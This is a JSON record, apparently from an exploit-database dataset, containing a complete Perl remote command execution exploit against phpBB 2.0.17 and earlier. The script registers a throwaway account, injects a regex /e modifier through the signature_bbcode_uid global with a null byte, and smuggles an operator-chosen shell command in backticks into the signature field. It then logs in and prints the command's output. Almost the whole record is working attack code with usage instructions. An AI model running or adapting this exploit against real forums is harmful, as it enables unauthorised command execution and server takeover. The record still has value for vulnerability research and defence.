{
  "id": "1388",
  "title": "phpBB 2.0.17 - &#039;signature_bbcode_uid&#039; Remot Command",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n# phpBB <= 2.0.17 remote command execution exploit\r\n# need for work: \r\n# 1. PHP 5 < 5.0.5\r\n# 2. register_globals=On\r\n# 3. magic_quotes off\r\n# ------------------------------------------------\r\n# (c)oded by 1dt.w0lf\r\n# RST/GHC\r\n# http://rst.void.ru\r\n# http://ghc.ru\r\n# 03.11.05\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\nif(@ARGV < 2) { usage(); }\r\n\r\nhead();\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$cookie_jar = HTTP::Cookies->new();\r\n\r\nfor($i=0;$i<5;$i++)\r\n {\r\n  $rand .= int(rand(9));  \r\n }\r\n\r\n$name     = 'r57phpBB2017xpl'.$rand;\r\n$password = 'r57phpBB2017xpl'.$rand;\r\n$path = $ARGV[0];\r\n$cmd  = $ARGV[1];\r\n$xpl->cookie_jar( $cookie_jar );\r\n\r\n$res = $xpl->post(\r\n  $path.'profile.php?GLOBALS[signature_bbcode_uid]=(.%2B)/e%00',\r\n\r\n  Content  => [  \r\n              'username' => $name,\r\n              'email' => $rand.'_bill_gates@microsoft.com',\r\n              'new_password' => $password,\r\n              'password_confirm' => $password,\r\n              'signature' => 'r57:`'.$cmd.'`',\r\n              'viewemail' => '0',\r\n              'hideonline' => '1',\r\n              'notifyreply' => '0',\r\n              'notifypm' => '0',\r\n              'popup_pm' => '0',\r\n              'attachsig' => '0',\r\n              'allowbbcode' => '1',\r\n              'allowhtml' => '1',\r\n              'allowsmilies' => '0',\r\n              'mode' => 'register',\r\n              'agreed' => 'true',\r\n              'coppa' => '0',\r\n              'submit' => 'Submit',\r\n              ],\r\n  );\r\n\r\nif($res->content =~ /form action=\\\"profile.php/) { print \"Failed to register user $name\\r\\n\"; exit(); }\r\nelse { print \"Done. User $name successfully registered!\\r\\n\"; }\r\n\r\n$res = $xpl->post(\r\n  $path.'login.php',\r\n  Content  => [\r\n              'username' => $name,\r\n              'password' => $password,\r\n              'redirect' => '',\r\n              'login'    => 'Log in',\r\n              ],Referer => $path.'login.php');\r\n\r\n$res = $xpl->get($path.'profile.php?mode=editprofile');\r\n@content = split(\"\\n\",$res->content);\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\nfor(@content)\r\n {\r\n if(/<\\/textarea>/) { $p = 0; }\r\n print $_.\"\\r\\n\" if $p;\r\n if(/<textarea name=\"signature\"/){ $p = 1; }\r\n }\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n\r\nsub head()\r\n {\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n print \" PhpBB <= 2.0.17, PHP 5 < 5.0.5 remote command execution exploit by RST/GHC\\r\\n\";   \r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n }\r\n \r\nsub usage()\r\n {\r\n head();\r\n print \" Usage: r57phpBB2017.pl <path> <cmd>\\r\\n\";\r\n print \" <path> - Path to forum e.g. http://phpbb.com/forum/\\r\\n\";\r\n print \" <cmd>  - Command for execute\\r\\n\";\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n print \"(c)oded by 1dt.w0lf , RST/GHC , http://rst.void.ru , http://ghc.ru\\r\\n\";\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2005-12-24]",
  "url": "https://www.exploit-db.com/exploits/1388"
}